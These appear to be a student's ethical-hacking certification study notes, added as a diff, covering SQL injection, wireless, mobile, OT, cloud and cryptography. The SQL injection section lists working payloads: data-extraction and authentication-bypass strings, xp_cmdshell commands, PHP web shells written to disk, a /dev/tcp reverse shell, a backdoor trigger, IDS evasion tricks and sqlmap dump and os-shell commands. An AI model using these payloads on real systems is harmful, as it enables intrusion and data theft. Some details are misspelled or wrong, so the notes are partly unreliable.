+		http://certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
+			- syntax error converting the nvarchar value '[COLUMN NAME 1]' to a column of data type in
+	Extract 1st Database Table
+		http://certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 name from sysobjects where xtype=char(85)))--
+			- syntax error converting the nvarchar value '[TABLE NAME 1]' to a column of data type int
+	Extract 1st Field of 1st Row (Data)
+		http://certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
+			- syntax error converting the nvarchar value '[FIELD 1 VALUE]' to a column of data type int
+			
+Blind SQL Injection - Extract Database User
+	Check for username legth
+		http://target.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
+			- keep increasing the value of LEN(USER) until the DBMS returns TRUE
+	Check if 1st Character in the username contains 'A' (a=97), 'B' or 'C' (etc)
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+			- keep increasing the value of )))= until the DBMS returns TRUE
+	Check if 2nd character in the username contains 'A'...
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=99) WAITFOR DELAY '00:00:10'--
+	Check if 3rd character in the username contains 'A'...
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=97) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=98) WAITFOR DELAY '00:00:10'--
+		http://target.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=99) WAITFOR DELAY '00:00:10'--
+	IT'S JUST A GUESSING GAME UNTIL IT TELLS YOU EVERYTHING - TRUE OR FALSE
+
+
+Creating Database Accounts
+	Microsoft SQL Server
+		exec sp_addlogin 'victor', 'Pass123'
+		exec sp_addrvrolemember 'victor', 'sysadmin'
+	Oracle
+		CREATE USER victor IDENTIFIED BY Pass123
+		TEMPORARY TABLESPACE temp
+		DEFAULT TABLESPACE users;
+		GRANT CONNECT TO victor;
+		GRAND RESOURCE TO victor;
+	Microsoft Access
+		CREATE USER victor
+		IDENTIFIED BY 'Pass123'
+	MySQL
+		INSERT INTO mysql.user (user, host, password)
+		VALUES ('victor', 'localhost',
+		PASSWORD('Pass123'))
+		
+Interacting With the Operating System
+	Two ways:
+		1. Reading and writing system files from the disk
+		2. Direct command execution via remote shell
+			- both methods are restricted by the db's running privs and perms
+	MSSQL OS Interaction:		
+		'; exec master..xp_cmdshell 'ipconfig > text.txt' --
+		'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
+		'; begin declare @data varchar(8000) ; set @data='| ' ; select @data=@data+txt+' | ' from tmp where txt<@data ; select @data as x into temp end --
+		' and 1 in (select substring(x,1,256) from temp) --
+		'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
+	MySQL OS Interaction
+		CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
+		CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
+		LOAD_FILE()
+			- within MySQL is ued to read and return the contents of a file located within the MySQL server
+		INTO OUTFILE()
+			- often used to run a query and dump the results into a file
+		NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
+			- if successful the injection will display the contents of the passwd file
+		NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
+			- if successful will be possible to run system commands via the $_GET global
+			- then..
+			http://certifiedhacker.com/shell.php?command=wget    (or whatever command you want to run)
+
+Finding and Bypassing Admin Panel of a Website
+	- attackers try to find the admin panel of a website using simple Google dorks and then bypass the administrator authentication using SQL injection attack
+	Malicious inputs used to bypass authentication:
+		' or 1=1
+		1'or'1'='1
+		admin'--
+		" or 0=0 --
+		or 0=0 --
+		' or 0=0
+		or 0=0 #
+		
+Creating Server Backdoors using SQL Injection
+	Getting OS Shell
+		- if an attacker can access the web server they can use the following MySQL query to create a PHP shell on the server
+			SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'
+		- to learn the location of the database in the web server, an attacker can use the following SQL injection query which gives the directory structure:
+			SELECT @@datadir;
+		- an attacker with the help of the directory structure can find the location to place the shell on the web server
+		- MSSQL has built-in functions such as xp_cmdshell to call the OS functions at runtime
+		- for example the following statement creates an interactive shell listening at 10.0.0.1 and port 8080
+			EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
+	Creating a Database Backdoor
+		- you can use database triggers to create backdoors
+		- for example if an online shop stores the details of all the items it sells in a database table called ITEMS, an attacker may inject a malicious trigger on that table that will automatically set the price of the item to 0
+			CREATE OR REPLACE TRIGGER SET_PRICE
+			AFTER INSERT OR UPDATE ON ITEMS
+			FOR EACH ROW
+			BEGIN
+				UPDATE ITEMS
+				SET Price = 0;
+			END;
+
+Tools:
+	sqlmap  : automates the process of detecting and exploiting SQL injection flaws and the taking over of database servers
+	mole  :  mole is an SQL injection exploitation tool that detects the injection and exploits it only by pro
+		
+		
+Types of Signature Evasion Techniques
+	1. In-Line Comment
+		- obscures input strings by inserting in-line comments between SQL keywords
+		'/**/UNION/**/SELECT/**/password/**FROM/**Users/**/WHERE/**/username/**/LIKE/**/'admin'--
+			- adding /**/ is an inline comment
+		UN/**/ION
+			- you can also carve up individual statements the comments get disregarded
+	2. Char Encoding
+		- uses the built-in CHAR function to represent a character
+		'union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+			is string=/ect/passwd	
+	3. String Concatenation
+		- concatenates text to creat an SQL keyword using DB specific instructions
+		- split instructions using execution commands that allow for the concatenation of text in a server
+		Oracle: '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+		MSSQL: '; EXEC ('DRO' + 'P T' + 'AB' + 'LE')
+		- compose SQL statement by concatenating strings instead of a parameterized query
+			MySQL: '; EXECUTE CONCAT('INSE','RT US','ER')
+	4. Obfuscated Codes
+		- SQL statement that has been made difficult to understand
+	5. Manipulating White Spaces
+		- obscures input strings by dropping white space between the SQL keywords
+		"UNION SELECT"  =/=   "UNION      SELECT"
+	6. HEX Encoding
+		- uses hex encoding to represent an SQL query string
+	7. Sophisticated Matches
+		- alternative expressions to 'or1=1 ie 'or2=2 
+		- any statement that is true will suffice
+		'or7>1
+		'or1<9
+		'or'john'='john'
+		'or5 BETWEEN 1 AND 7
+	8. URL encoding
+		- obscure input string by adding % before each code point
+	9. Null Byte
+		- uses the null byte (%00) character prior to a string in order to bypass the detection mechanism
+	10. Case Variation
+		-'oR1=1
+		UnIoN SeLeCt uSeR_ID, pAsSwoRd fRom aDMiN WhERe UsEr_NaME='ADmIn'--
+	11. Declare Variables
+		- uses variables that can be used to pass a series of specially crafted SQL statements and bypass the detection mechanism
+		assume "UNION Select Password"
+			; declare @sqlvar nvarchar(70); set @sqlvar=(N'UNI' + N'ON' +N' SELECT' + N'Password'); EXEC(@sqlvar)
+	12. IP Fragmentation
+		- uses packet fragments to obscure an attack payload which goes undetected by the signature mechanism
+		- only effective if the IDS doesn't reassemble the packets 
+		
+How to Defend Against SQL Injection Attacks: Use Type-Safe SQL Parameters
+	- enforce TYPE and LENGTH CHECKS using Parameter Collection so that the input is treated as a literal value instead of an executable code
+		
+	
+Lab: SQLMap
+	- will need to get the cookie from dev tools after being logged in
+	# sqlmap -u "http://target.com/viewprofile.aspx?id=1" --cookie="cookiecopiedfrominspector" --dbs
+		- this will enumerate the DB names
+	# sqlmap -u "http://target.com/viewprofile.aspx?id=1" --cookie="cookiecopiedfrominspector" -D dbname --tables
+		- this will enumerate the table contents of the specified dbname
+	# sqlmap -u "http://target.com/viewprofile.aspx?id=1" --cookie="cookiecopiedfrominspector" -D dbname -T nameofthetable --dump
+	
+	# sqlmap -u "http://target.com/viewprofile.aspx?id=1" --cookie="cookiecopiedfrominspector" --os-shell
+		- will pop a shell
+		
+Lab: OWASP ZAP
+	- automated scan
+	- URL to attack leave everything else and click attack
+	- check alerts tab
+	- if there's SQL injection then yay
+
+----------
+
+
+Defcon 17: Advanced Injection (Joseph McCray)
+
+Methodology:
+	1. Identify the injection (tool or manual) 
+		- tools only test one or two types
+		- manual is best
+		- can it be injected?
+	2. Determine injection type
+		- is it an integer or a string?
+		http://target.com/page.asp?id=1 having 1=1--
+			Error: "Column [COLUMN NAME] is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause
+				- then we know that it's an integer
+		http://target.com/page.asp?id=x' having 1=1--
+			if you get the same error then you know that it's a string and you need to use the '			
+	3. Attack
+		- Error Based (easiest)
+		- Union-based (great for data extraction)
+		- Blind (last restort)
+
+Error based SQL injection syntax for extracting the USER
+		http://target.com/page.asp?id=1 or 1=convert(int,(USER))--
+		"You can't convert the value of 'user' into an integer what are you an idiot"
+
+		Replace USER with: DB_NAME, @@servername, @@version
+			- to find out those things
+			
+Union-based SQL injection syntax for extracting the USER
+	http://target.com/asp?id=1 UNION SELECT ALL 1--
+		"All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists."
+			- this means that you have to guess how many colums
+	http://target.com/page.asp?id=1 UNION SELECT ALL 1,2--
+		ERROR
+	http://target.com/page.asp?id=1 UNION SELECT ALL 1,2,3--	
+		ERROR
+	http://target.com/page.asp?id=1 UNION SELECT ALL 1,2,3,4--	
+		no error so now you know it's 4 columns
+		now...
+		http://target.com/page.asp?id=null UNION SELECT ALL 1,USER,3,4--
+		
+Blind SQL injection syntax for extracting the USER
+	http://target.com/page.asp?id=1;IF(LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+		"If the database user's length is 1 character, wait 10 seconds
+		Page returns immediately, you know that it is not
+http://target.com/page.asp?id=1;IF(LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+		Page returns immediately
+http://target.com/page.asp?id=1;IF(LEN(USER)=3) WAITFOR DELAY '00:00:10'--
+		Hangs for 10 seconds you know it's 3 characters
+
+Building the UNION
+	
+	http://target.com/page.php?id=1 union all select 1,2,3,4,5/*   <-- gives valid page
+		Change the first part of the query to a null or negative value so we can see what field will echo data back to us
+	http://target.com/page.php?id=-1 union all select 1,2,3,4,5/*   <-- gives valid page but with the number 2, and 3 on it
+	http://target.com/page.php?id=null union all select 1,2,3,4,5/*   <-- gives valid page but with the number 2 and 3 on it
+		Now we know that column numbers 2 and 3 will echo data back to us
+		
+	Use NULL in union as much as possible for when you don't know the data type - it might be a favicon or something weird
+	
+Bypassing IDS :
+	instead of ' or 1=1 you can bypass signature based rules with 'or2=2 or 'or9=9 etc
+	you can encode the string in hex, UTF-8, etc to bypass signatures if the IDS doesn't use normalization
+
+CHEAT SHEET: https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+
+
+===================================================================================
+
+MODULE 16: Wireless
+
+- 802.11x  uses a centralized authentication server 
+	REMOTE AUTHENTICATION DIAL IN USER SERVICE (RADIUS)
+		- sends authentication keys to both the AP and the cleint that require authentication with the AP
+		- key enables the AP to identify a particular wireless client
+
+WEP (Wired Equivelant Privacy) is defined by the 802.11b standard
+	- designed to provide a wireless lan with a level of security and privacy comparable to that of a wired LAN
+	- uses 24 bit initialization vector (IV) to form stream cipher RC4 for confidentiality and the CRC-32 checksum for integrity
+	- has significant vulnerabilities and design flaws and can easily be cracked
+
+WPA (Wi-Fi Protected Access)
+	- defined by 802.11i standards
+	- uses a Temporal Key Integrity Protocol (TKIP) that utilizes the RC4 stream cipher encryption with 128bi keys and 64bit MIC integrity check
+	- WPA uses TKIP to eliminate the weaknesses of WEP by including per-packet mixing functions, message integrity checks, extended initialization vectors and re-keying mechanisms
+WPA2
+	- upgrades WPA
+	- includes mandatory support for counter mode with cipher block chaining message authentication code protocol (CCMP)
+		- an AES-based encryption mode with strong security
+	WPA2-Personal:
+		- uses a set-up password (Pre-shared key, PSK) to protect unauthorized network accesses
+		- in PSK mode each wireless network device encrypts the network traffic using a 128bit key
+			- derived from a passphrase of 8-63 ASCII characters
+	WPA2-Enterprise
+		- includes EAP or RADIUS for centralized client authentication using multiple authentication methods
+			- token cards and Kerberos
+		- users are assigned login credentials by a centralized server
+		- must present when connecting to the network
+	WPA3
+		- advanced implementation of WPA2 providing trailblazing protocols and uses AES-GCMP-256 encryption
+		WPA3-Personal:
+			- mainly used to deliver password-based authentication using the SAE protocol aka the "Dragonfly Key Exchange"
+			- is resistant to offline dictionary attacks and key recovery attacks
+		WPA3-Enterprise:
+			- protects sensitive data using many cryptographic algorithms
+			- provides authenticated encryption using GCMP-256
+			- uses HMAC-SHA-384 to generate cryptographic keys
+			- uses ECDSA-384 for exchanging keys
+
+Cracking WEP involves injecting packets to get a statistical sample of arp requests	
+Script that wraps airocrack-ng for packet injection of WEP :: airoscript (from BT4)
+
+Cracking WPA involves capturing a handshake and offline cracking it
+
+===================================================================================
+
+MODULE 17: Mobile platforms
+
+Anatomy of a Mobile Attack
+
+Point 1 - The Device
+	- phising, framing, clickjacking, MITM, buffer overflow, data caching
+	- phone/sms: baseband, SMiShing
+	- apps: 
+		- sensitive data storage
+		- no/weak encryption
+		- improper SSL validation
+		- configuration manipulation
+		- dynamic runtim injection
+		- unintended permissions
+		- escalated privileges
+		- access to the device and user info
+		- 3rd party code
+		- intent hijacking
+		- zip directory traversal
+		- side channel attack
+Point 2: The Network
+	- wifi (no/weak encryption)
+	- rogue AP
+	- packet sniffing
+	- MITM
+	- session hijacking
+	- DNS poisoning
+	- SSLStrip
+	- fake SSL certificate
+	- BGP hijacking
+	- HTTP proxies
+Point 3: The Data Center / Cloud
+	Webserver:
+	- platform vulnerabilities
+	- server misconfiguration
+	- XSS
+	- XSRF (Cross-Site Request Forgery)
+	- weak input validation
+	- brute force attacks
+	- cross origin resource sharing
+	- side channel attack
+	- hypervisor attack
+	DATABASE:
+	- SQL injection
+	- privilege escalation
+	- data dumping
+	- OS command execution
+
+Pulling info out of rooted android: "ANDRILLER" shareware
+
+DroidSheep
+	- automated session hijacking tool (sidejacking)
+	- listens for HTTP packets sent over wireless 802.11 and extracts the session IDs from these packets to reuse them
+	- can capture sessions using the libpcap library and supports OPEN networks, WEP, and WPA and WPA2 (PSK only)
+
+PhoneSploit
+	- Android Debug Bridge (ADB) is a CLI tool that allows attackers to communicate with the target android device
+	- if the target device has TCP debugging enabled on port 5555 attackers can use tools such as PhoneSploit to perform various activities:
+		- screen capping
+		- dumping system info
+		- viewing running applications
+		- installing/uninstalling any app
+		- turning wifi on/off
+	
+FaceNiff
+	- android app that allows you to sniff and intercept web session profiles over the wifi that your mobile is connected to
+	- is possible to hijack sessions only when wifi is not using EAP and over any private network (open/WEP/WPA-PSK/WPA2-PSK)
+	
+Others:
+	- Packet Capture
+	- tPacketCapture
+	- Android PCAP
+	- Sniffer Wicap 2 Demo
+	- Testel Droid
+	- Metaspoloit
+		- can create a malicious APK with msfvenom just like a bin or exe
+
+iOS Malware
+	- NoReboot
+		- is a trojan that allows attackers to spy on the victim's device by exploiting the camera and mic
+		- can fake device reboot and run in the bg without any interruption during an op
+		InCallService : "Slide to power off" UI
+		SpringBoard: Receive the notification and proceed to shutdown process
+		Backbaordd : after Springboard exists, backboarded is responsible for the spinning wheel
+	Pegasus
+		- developed by Israel-based company that supplies spyware to international government agencies to snoop on internal and external political opponents
+		- it exploits vunls such as zero-click exploits
+		- used to monitor terrorists, activists or political propaganda
+	- XcodeSpy
+	- XCSSET
+	- KeyRaider
+	- Prynt Stealer
+	- Clicker Trojan
+iOS Tracking Tools
+	- Find My (native)
+		- Settings > Your Name > Find My
+	- SpyBubble (thespybubble.com)
+	- Prey Find my Phone Tracker GPS
+	- iHound
+	- FollowMee GPS location tracker
+	- Mobistealth
+	
+OT = Operational Technology 
+
+Mitre ATT&CK for ICS
+	Initial Access
+		- methods or techniques that an attacker can employ to establish initial access within the targeted ICS environment
+		- include drive-by compromise, exploitation of a public-facing software application, exploiting remote services
+	Execution
+		- techniques used to execute malicious code, manipulate data, or other system functions through illigitimate approaches
+		- techniques include changing the operating mode, use of the CLI, execution through APIs
+	Persistence
+		- how attacker retains access to ICS environment even if the compromised device is restarted or coms are interrupted
+		- include modification of a program, insertion of module firmware, execution through APIs and project file infection
+	Privilege Escalation
+		- gaining higher level access and authorization to perform further activities on the ICS system
+		-  include software exploitation and hooking
+	Evasion
+		- refers to techniques used to evade traditional defense mechanisms throughout their operations
+		- techniques include removing the indicators, rootkits, changing operator mode, etc
+	Discovery
+		- gaining information about an ICS environment to assess and identify the target assets
+		- include removal of indicators, enumeration of the network connection, network sniffing, identification of remote systems
+
+OT Hacking Methodology
+	Information gathering
+	Vulnerability Scanning
+	Launch Attacks
+	Gain Remote Access
+	Maintain Access
+	
+------------------------------------
+
+Module 19: Cloud
+
+Infrastructure as a Service
+	Network in the Cloud
+
+Platform as a Service	
+	Host
+	
+Software as a Service
+	Application
+	
+Public Cloud
+	- services are rendered over a network that is open for public use
+Private Cloud
+	- cloud infrastructure is operated for a single organization only
+Community Cloud
+	- shared infrastructure between several orgs from a specific community with common concerns (security, compliance, jurisdiction, etc).
+Hybrid Cloud
+	- combination of two or more clouds that remain unique entities but are bound together thereby offering the benefits of multiple deployment models
+Multi Cloud
+	- dynamic heterogeneous environment that combines workloads across multiple cloud vendors, managed via one proprietary interface to achieve long term business goals
+
+Cloud Computing
+	- highly centralized
+	- thousands of data centers
+	- internet/cloud
+
+Fog Computing
+	- is a distributed and independent digital environment in which applications and data storage are positioned between data sources (devices generating data) and a cloud service
+	- acts as an intermediary between the hardware and remote servers and is also called an "intelligent gateway"
+	- used for enhanced data processing, storage and analysis in a quick and efficient manner
+	- centralized
+Edge Computing
+	- is a distributed decentralized computing model in which data processing is performed close to edge devices
+	- helps in building automation systems that perform fast processing and enables efficient real-=time apps
+	- decentralized
+
+Container Technology Architecture
+	- a container is a package of an app/software including all its dependencies such as library files, config files, binaries and other resources that run independently of other processes in the cloud environment
+	- CaaS is a service that includes the virtualization of containers and container management through orchestrators
+	- using CaaS subscribers can develop rich, scalable containerized applications through the cloud or on-site data centers
+Containers vs Virtual Machines
+	- virtualization is the ability to run multiple operating systems on a single physical system and share the underlying resources such as a server, storage device or network
+	- containers are placed on top of one physical server and host operating system, and share the operating systems kernel binaries and libraries thereby reducing the need for reproducing the OS
+	
+Function as a Service (FaaS) aka Serverless Computing
+	- is a cloud-based application architecture where application infrastructure and supporting services are provided by the cloud vendor as they are needed
+	- serverless computing simplifies the process of application deployment and eliminates the need for managing the server and hardware by the devs
+	- aka "provision on the fly"
+	
+Side-Channel Attack or Cross-guest VM Breaches
+	- the attacker compromises the cloud by placing a malicious virtual machine near to the target cloud servers and then launches a side channel attack
+	- the attacker runs a VM on the same physical host as the victim's virtual machine and takes advantage of the shared physical resources (processor cache) to steal data (cryptographic keys) from the victim
+	- side channel attacks can be implemented by any co-resident user due to the vunerabilities in shared technology resources
+
+Man-in-the-Cloud (MITC) Attack
+	- advanced version of MITM
+	- an attacker uses an exploit that intercepts and manipulates the communication between two parties while the MITC attacks are performed by abusing cloud file synchronization services such as Google Drive or Drop Box for data compromise, command and control, data exfiltration and remote access
+	- the attacker tricks the victim into installing a malicious code, which plants the attacker's synchronization token on the victim's drive
+	- then the attacker steals the victim's synchronization token and uses the stolen token to gain access to the victim's files
+	- later the attacker restores the malicious token with the original synchronized token of the victim, thus returning the drive application to its original state and stays undetected
+
+Cloud Hopper Attack
+	- triggered at the managed service providers (MSPs) and their users
+	- attackers initiate spear-phishing emails with custom made malware to compromise the accounts of staff of cloud service firms to obtain confidential information
+
+Cloud Cryptojacking
+	- is the unauthorized use of the victim's computer to stealthily mine digital currency
+	- highly lucrative which involve both external attackers and rogue insiders
+	- attackers leverage attack vectors like cloud misconfigurations, compromised websites, and client or server-side vulnerabilities
+	
+Enumerating S3 Buckets
+	- Amazon Simple Storage Service (S3) is a scalable cloud storage service used by Amazon AWS where files, folders and objects are stored via web APIs
+	- attackers often try to find the bucket's location and name to test its security and identify vulnerabilities in the bucket implementation
+		INSPECTING HTML: attackers analyze the source code of the HTML web pages in the background to fild URLs to the target S3 buckets
+		BRUTE-FORCING URL: attackers use Burp to perform brute forcing attacks on the target bucket's URL to identify the correct URL to the bucket
+		FINDING SUBDOMAINS: attackers use tools such as OWASP Amass, or Robtex to identify subdomains related to the target bucket
+
+Identifying Open S3 Buckets using S3Scanner
+	~# s3canner scan --buckets-file bucket-names.txt
+	
+Enumerating AWS Account IDs
+	- AWS accounts are identified via unique IDs which when exposed in the public domain can be leveraged by attackers to perform various attacks on the target cloud services
+	- using AWS account IDs, attackers can perform various activities such as resource enumeration, IAM role assumption, and the invocation of a Lambda function
+	- can be enumerated via following sources:
+		- AWS error messages
+		- code repositories such as GitHub
+		- screenshots
+		- RDS (Relational Database Service) public snapshots
+		- Public EBS (Elastic Block Store) snapshots
+		- Public AMIs (Amazon Machine Images)
+		- people posting personal IDs to seek online assistance/troubleshooting
+
+Enumerating IAM roles
+	- attackers enumerate IAM role names by analyzing the AWS error messages which reveal information regarding the existence of a user
+	- in AWS cloud services, users can perform numerous attempts to assume a role. For every failed attempt, AWS response messages reveal information about the existence of the role
+		Information gathered by attackers through IAM role enumeration:
+			- internal software/stacks
+			- IAM user names (used for SE)
+			- AWS services in use
+			- 3rd party software
+			
+Hacking Container Volumes
+	- Kubernetes supports different types of volumens such as the Network File System (NFS) and Internet Small Computer Systems Interface (iSCSI)
+	- a volume is like a directory that stores files and is accessible to all the containers in a pod
+	- attackers can exploit weak and default configurations in these volumes to launch privilege escalation attacks and perform lateral movement in the internal network
+		- Accessing Master Nodes: If attackers can gain access to the API or etcd, they can easily retrieve confidential details of the mounted volumes
+		- Accessing Nodes: kubelet manages the pods, so if attackers can access a node in a pod they can easily gain access to all the volumes used within the pod
+		- Accessing Container: by gaining access to the container, attackers can configure a hostpath volume type to retrieve sensitive information from the node
+		
+Cloud Network Security
+	Cloud network security can be achieved in the following ways:
+	1. Virtual Private Cloud (VPN)
+		- is a secure and independent private cloud environment that resides within the public cloud
+		- VPN clients can execute programs, save data, host applications and perform anything they wish on a private network using their individual accounts
+	2. Public and Private Subnets
+		-the subnets in VPN can be public or private. The virtual machines in the public subnet can transmit outbound traffic directly over the web
+		- the private subnet can communicate via the internet using a NAT gateway
+		
+Cloud Access Security Broker (CASB)
+	- is an on-premise or cloud-hosted solution responsible for enforcing security, compliance and governance policies for the cloud apps
+	- CASBs are placed between the cloud service consumers and service providers
+	- Azure includes a CASB
+	
+Next-Generation Secure Web Gateway (NG SWG)
+	- is a cloud-based security solution that protects an orgs network from cloud-based threats, malware infections and data theft activities and allows clients to securely access cloud services
+		- Netskope Next Gen Secure Web Gateway (netskope.com)
+		- Cloudflare Gateway (cloudflare.com)
+		- Quantum Next Generation Firewall Security Gateways (checkpoint.com)
+		
+----------------------------------
+
+MODULE 20 : Cryptography
+
+Symmetric Encryption
+	- "secret key", "shared key", "private key"
+	- use the same key for encryption as it does for decryption
+
+Asymmetric Encryption
+	- "public key"
+	- uses different encryption keys (public and private) for encryption and decryption
+
+Ciphers are algorithms used to encrypt or decrypt the data.
+
+Classical Ciphers:
+	- substitution cipher: a block of plaintext is replaced with ciphertext
+	- transposition cipher: the letters of the plaintext are shifting about to form the cryptogram
+
+Modern Ciphers:
+	Based on the type of key used
+		- Private Key
+		- Public key
+	Based on the type of input data
+		- block cipher (encrypts blocks of data of fixed size)
+		- stream cipher (encrypts continuous streams of data)
+		
+Data Encryption Standard (DES)
+	- designed to encipher and decipher blocks of data consisting of 64bits under control of a 56bit key
+	- was originally 128bit IBM "Lucifer" but got cut in half
+	- DES is the archetypal block cipher
+		- an algorithm that takees a fixed length string of plaintext bits and transforms it into a ciphertext bit string of the same length
+	- due to the inherent weakness of DES with today's technologies some orgs tripple repeat the process (3DES) for added strength until they can afford to update their equipment to AES capabilities
+	
+Advanced Encryption Standard (AES)
+	- is a symmetric key algorithm used to by the US government agencies to secure sensitive but unclassified material
+	- AES is an iterated block cipher that works by repeating the same operation multiple times
+	- it has 128 bit block size with key sizes of 128, 192 and 256 bits for AES-128, AES-192 and AES-256 repsectively
+	
+Ron Rivest Cipher (RC)
+
+RC4: a variable key size symmetric key stream cipher with byte-oriented operations and is based on the use of a random permutation
+
+RC5: a parameterized algorithm with a variable block size, variable key size, and variable number of rounds. Key size is 128 bits
+
+RC6: symmetric key block cipher rerived from RC5 with two additional features:
+	- integer multiplication
+	- four 4-bit working registers (RC5 uses two 2-bit registers)
+	
+Rivest Shamir Adleman (RSA)
+	- RSA is a public key cryptosystem for Internet encryption and authentication
+	- it uses modular arithetic and elementary number theories to perform computations using two large prime numbers
+	
+Diffie-Hellman
+	- a cryptographic protocol that allows two parties to establish a shared key over an insecure channel
+	- it does not provide any authentication for the key exchange and is vulnerable to many cryptographic attacks
+	
+Message Digest (One-Way Hash) Funcitons
+	- hash functions calculate a unique fixed size bit string representation called a message digest of any arbitrary block of information
+	- if any given bit of the function's input is changed then every output bit has a 50 percent chance of changing
+	- it is computationally infeasible to have two files with the same message digest value
+Message Digest Functions
+	MD5 : takes a message of arbitrary length as the input and then outputs a 128bit fingerprint or message digest of the input
+		- MD5 is not collision resistant; use of the latest algorithms such as MD6, SHA-3 and SHA-3 recommended
+	MD6 : uses a Merkle tree-like structure to allow for immense parallel computation of hashes for very long inputs
+		- is resistant to different cryptanalysis attacks
+	Both are used for digital signature applications, file integrity checking and storing passwords
+
+Secure Hashing Algorithm (SHA)
+	- this algorithm generates a cryptographically secure one-way hash
+	- was published by the National Institute of Standards and Technology (NIST) as a US Federal Information Processing Standard
+		SHA-1 : produced a 160 bit digest from a message with a maximum length of (264-1) bits and it resembles the MD5 algorithm
+		SHA-2 : it is a family of two similar hash functions with different block sizes, namely, SHA-256, which uses 32 bit words, and SHA-512 which uses 64 bit words
+		SHA-3 : uses the sponge construction in which message blocks are XORed into the initial bits of the state which is then invertibly permuted
+		
+Hardware-Based Encryption
+	- uses computer hardware for assisting or replacing the software when the data encryption process is underway
+	- these devices are also capable of storing encryption keys and other sensitive information in secured areas of RAM or other nonvolatile storage devices
+		TPM : Trusted Platform Module - crypto-procesor that is present on the motherboard that can securely store the encryption keys and it can perform many cryptographic operations
+		HSM : Hardare Security Module - an additional external security device that is used in a system for crypto-processing and can be used for managing, generating and securely storing cryptographic keys
+		USB : USB encryption is an additional feature for USB storage devices that offers onboard encryption services
+		Hard Drive Encryption : a tech where the data stored in the hardware can be encrypted using a wide range of encryption options
+		
+Public Key Infrastructure (PKI)
+	- is a set of hardware, software, people, policies and procedures required to create, manage, distribute, use, store and revoke digital certificates
+
+Components of PKI:
+	Certificate Management System: Generates, distributes, stores and verifies certificates
+	Digital Certificates: Establish people's credentials in online transactions
+	Validation Authority (VA): stores certificates (with their public keys)
+	Certificate Authority (CA): issues and verifies digital certificates
+	End User: Requests, manages, and uses certificates
+	Registration Authority (RA): Acts as the verifier for the certificate authority
+	
+Signed Certificate vs Self-Signed Certificate
+	Signed Certificate
+		- user gets a digital certificate from a trustworthy CA
+		- the digital certificate contains name of the certificate holder, a serial number, expiration dates, a copy of the certificate holder's public key and the digital signature of the CA
+		- the user signs the document using the digital certificate and sends to the receiver
+		- the receiver can verify the certificate by enquiring with validation authority (VA)
+		- the VA verifies the validity of the certificate
+	Self-Signed Certificate
+		- user creates self-signed digital certificate using a certification creation tools such as Adobe Acrobat Reader, Java's keytool or Apple's Keychain
+		- the certificate contains name of the user, user's public key and his digital signature
+		- the user signs the document using the self-signed certificate and sends to the receiver
+		- the receiver can verify the certificate by enquiring with the user
+		- user verifies the certificate to the receiver
+		
+Digital Signature
+	- uses asymmetric croptography to simulate the security properties of a signature in digital rather than written form
+	- a digital signature may be further protected by encrypting the signed email for confidentiality
+	- provides authenticity and non-repudiation
+	- does not provide confidentiality
+	
+Secure Sockets Layer (SSL)
+	- application layer protocol developed by Netscape for managing the security of message transmission on the internet
+	- uses RSA asymmetric (public key) encryption to encrypt data transferred over SSL connections
+
+Transport Layer Security (TLS)
+	- TLS is a protocol to establish secure connection between a client and a server and ensure the privacy and integrity of information during transmission
+	- successor to SSL
+	- uses RSA algorithm with 1024 and 2048 bit strengths
+	TLS Handshake Protocol : allows the client and server to authenticate each other, select an encryption algorithm and exchange a symmetric key prior to data exchange
+	TLS Record Protocol : Provides secured connections with an encryption method such as DES
+	
+Pretty Good Privacy (PGP) - Bill Zimmerman
+	- protocol used to encrypt and decrypt data that provides authentication and cryptographic privacy
+	- often used for data compression, digital signing, encryption and decryption of messages, emails, files, directories and to enhance the privacy of email comms
+	- combines the best features of both conventional and public key cryptography and is therefor known as a hybrid cryptosystem
+	- uses a Wen of Trust
+	Web of Trust (WOT):
+		- trust model of PGP, OpenPGP and GnuPG systems
